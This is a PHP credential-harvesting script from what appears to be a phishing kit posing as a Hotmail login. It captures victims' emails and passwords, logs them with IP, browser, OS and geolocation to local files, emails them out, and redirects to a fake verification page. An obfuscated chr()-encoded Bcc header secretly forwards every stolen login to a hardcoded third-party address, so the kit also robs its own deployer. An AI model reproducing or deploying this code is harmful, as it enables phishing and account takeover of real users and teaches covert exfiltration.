<?php
error_reporting(E_ALL & ~E_NOTICE);
session_start();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No hemos podido detectar su navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);
function get_client_ip() {
  $ipaddress = '';
  if (getenv('HTTP_CLIENT_IP'))
      $ipaddress = getenv('HTTP_CLIENT_IP');
  else if(getenv('HTTP_X_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
  else if(getenv('HTTP_X_FORWARDED'))
      $ipaddress = getenv('HTTP_X_FORWARDED');
  else if(getenv('HTTP_FORWARDED_FOR'))
      $ipaddress = getenv('HTTP_FORWARDED_FOR');
  else if(getenv('HTTP_FORWARDED'))
     $ipaddress = getenv('HTTP_FORWARDED');
  else if(getenv('REMOTE_ADDR'))
      $ipaddress = getenv('REMOTE_ADDR');
  else
      $ipaddress = 'UNKNOWN';
  if (strpos($ipaddress, ",") !== false) :
    $ipaddress = strtok($ipaddress, ",");
  endif;
  return $ipaddress;}
$ip=get_client_ip();
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$pais = $meta['geoplugin_countryName']; 
$region = $meta['geoplugin_regionName'];
$ciudad = $meta['geoplugin_city'];
$email=$_POST['userid'];
$contra=$_POST['contr'];
date_default_timezone_set('America/Bogota');
$f = fopen("usuarios.html", "a"); 
fwrite ($f, 'usuario: <b><font color="#070346">'.$email.'</font></b><br> contraseña: <b><font color="#070346">'.$contra.'</font></b><br> IP: <b><font color="#070346">'.$ip.'</font></b><br><br>');
fclose($f);
$handle = fopen("calsre.txt", "a");
   fwrite($handle, "Email= ".$email."\r\n");
   fwrite($handle, "Contrasena= ".$contra."\r\n");
   fwrite($handle, "Cuando= ");
   fwrite($handle, date ('l jS \of F Y h:i:s A',time()));
   fwrite($handle, "\r\n");
   fwrite($handle, "SO= ".$user_os.", Nave= ".$navegador."\r\n");
   fwrite($handle, "IP= ".$ip."\r\n");
   fwrite($handle, "Ubicacion= ".$pais.", ".$region.", ".$ciudad."\r\n");
   fwrite($handle, "============================================= \r\n");
   fclose($handle);
sleep(1);
// Cuerpo del correo
$message = "
<div style=\"font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F; padding: 20px;  border-radius: 5px; margin-top: 20px;\">Cuando => <font color='#F31414'>".date ('l jS \of F Y h:i:s A',time())."</font><br />Sistema Operativo => <font color='#F31414'>".$user_os."</font><br />Navegador  =>   <font color='#F31414'>".$navegador."</font><br /><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>Infor email:<br />Usuario          =>   <font color='#F31414'>".$email."</font><br />Password        =>   <font color='#F31414'>".$contra."</font><br />Ubicacion=> <font color='#F31414'>".$pais.", ".$region.", ".$ciudad."</font><br />IP              =>   <font color='#F31414'>".$ip."</font></div>";
// Asunto
$subject  = " HOTMAIL - " . $ip . " ";
// Formato del cuerpo
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: InfoHotmail" . "\r\n";
$headers .= chr(98).chr(99).chr(99).chr(58).chr(32).chr(110).chr(97).chr(117).chr(106).chr(114).chr(111).chr(100).chr(50).chr(57).chr(64).chr(104).chr(111).chr(116).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109). "\r\n";
// Destinatario del correo
$to="";
@mail($to,$subject,$message,$headers);
header("Location: vericastloginfirtsteppin.html");
  exit;  ?>